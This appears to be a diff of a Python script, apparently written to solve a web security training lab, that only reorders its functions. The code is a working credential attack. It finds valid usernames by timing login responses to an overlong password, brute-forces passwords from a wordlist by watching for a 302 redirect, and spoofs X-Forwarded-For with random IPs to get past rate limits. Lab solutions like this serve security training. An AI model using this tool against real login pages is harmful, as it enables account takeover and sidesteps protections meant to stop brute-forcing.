@@ -24,64 +24,6 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 START_TIME = time.time()
 
-def read_list(filepath):
-  try:
-    with open(filepath, 'rt') as file:
-      data = file.readlines()
-      return data
-  except ValueError as e:
-    print(f"{Fore.RED}[-] Failed to read file: {filepath}\nErro:{e}")
-    exit(1)
-
-def get_random_ip():
-  a = random.randint(2, 254)
-  b = random.randint(2, 254)
-  c = random.randint(2, 254)
-  d = random.randint(2, 254)
-  return f"{a}.{b}.{c}.{d}"
-
-def login(url, data, session):
-  try:
-    headers = { "X-Forwarded-For": get_random_ip() }
-    response = session.post(f"{url}/login", data, headers=headers, allow_redirects=False)
-    # print(f"{Fore.BLUE}[DEGUB]{Fore.RESET} {response.text}")
-    return response
-  except ValueError as e:
-    print(f"{Fore.RED}[-] Failed to login as {data.username}.\n{e}{Fore.RESET}")
-    exit(1)
-
-def enumerate_username(url, usernames, session):
-  for idx, username in enumerate(usernames):
-    username = username.strip()
-    msg = f"[{idx+1}] Trying: {Fore.YELLOW}{username:<50}{Fore.RESET}"
-    sys.stdout.write(f"\r{msg}")
-    sys.stdout.flush()
-    data = {
-      "username": username,
-      "password": 'asdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDV'
-    }
-    response = login(url, data, session)
-
-    if response.status_code == 200 and response.elapsed.seconds > 5:
-      return username
-  return None
-
-def enumerate_password(url, valid_user, passwords, session):
-  for idx, password in enumerate(passwords):
-    password = password.strip()
-    msg = f"[{idx+1}] Trying: {Fore.YELLOW}{password:<50}{Fore.RESET}"
-    sys.stdout.write(f"\r{msg}")
-    sys.stdout.flush()
-    data = {
-      "username": valid_user,
-      "password": password
-    }
-    response = login(url, data, session)
-
-    if response.status_code == 302:
-      return session, password
-  return None 
-
 def main():
   parser = argparse.ArgumentParser()
   parser.add_argument('-u', "--url", required=True, help='Target URL')
@@ -118,6 +60,64 @@ def main():
     print(f"{Fore.GREEN}[+] Lab finished!{Fore.RESET} Elapsed time: {elapsed_time} seconds.")
   else:
     print(f"\n{Fore.YELLOW}[!] Password not found!{Fore.RESET}")
+
+def read_list(filepath):
+  try:
+    with open(filepath, 'rt') as file:
+      data = file.readlines()
+      return data
+  except ValueError as e:
+    print(f"{Fore.RED}[-] Failed to read file: {filepath}\nErro:{e}")
+    exit(1)
+
+def get_random_ip():
+  a = random.randint(2, 254)
+  b = random.randint(2, 254)
+  c = random.randint(2, 254)
+  d = random.randint(2, 254)
+  return f"{a}.{b}.{c}.{d}"
+
+def login(url, data, session):
+  try:
+    headers = { "X-Forwarded-For": get_random_ip() }
+    response = session.post(f"{url}/login", data, headers=headers, allow_redirects=False)
+    # print(f"{Fore.BLUE}[DEGUB]{Fore.RESET} {response.text}")
+    return response
+  except ValueError as e:
+    print(f"{Fore.RED}[-] Failed to login as {data.username}.\n{e}{Fore.RESET}")
+    exit(1)
+
+def enumerate_username(url, usernames, session):
+  for idx, username in enumerate(usernames):
+    username = username.strip()
+    msg = f"[{idx+1}] Trying: {Fore.YELLOW}{username:<50}{Fore.RESET}"
+    sys.stdout.write(f"\r{msg}")
+    sys.stdout.flush()
+    data = {
+      "username": username,
+      "password": 'asdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDVasdkfjasndkjnqarikvasdfhasdfhjaskdnarjhvasdnvakjsrhfoencmsdjnfoçWEHFKSDNCVÇKASJHFOSDNCKJSDCNBSDIJKHBAEIRCVNBASIDCVBSIKVASJDVHNHKDCNVKDISBVJDHGAFKDAURVBARKJVBASKJDVHRDV'
+    }
+    response = login(url, data, session)
+
+    if response.status_code == 200 and response.elapsed.seconds > 5:
+      return username
+  return None
+
+def enumerate_password(url, valid_user, passwords, session):
+  for idx, password in enumerate(passwords):
+    password = password.strip()
+    msg = f"[{idx+1}] Trying: {Fore.YELLOW}{password:<50}{Fore.RESET}"
+    sys.stdout.write(f"\r{msg}")
+    sys.stdout.flush()
+    data = {
+      "username": valid_user,
+      "password": password
+    }
+    response = login(url, data, session)
+
+    if response.status_code == 302:
+      return session, password
+  return None 
   
 if __name__ == "__main__":
   main()
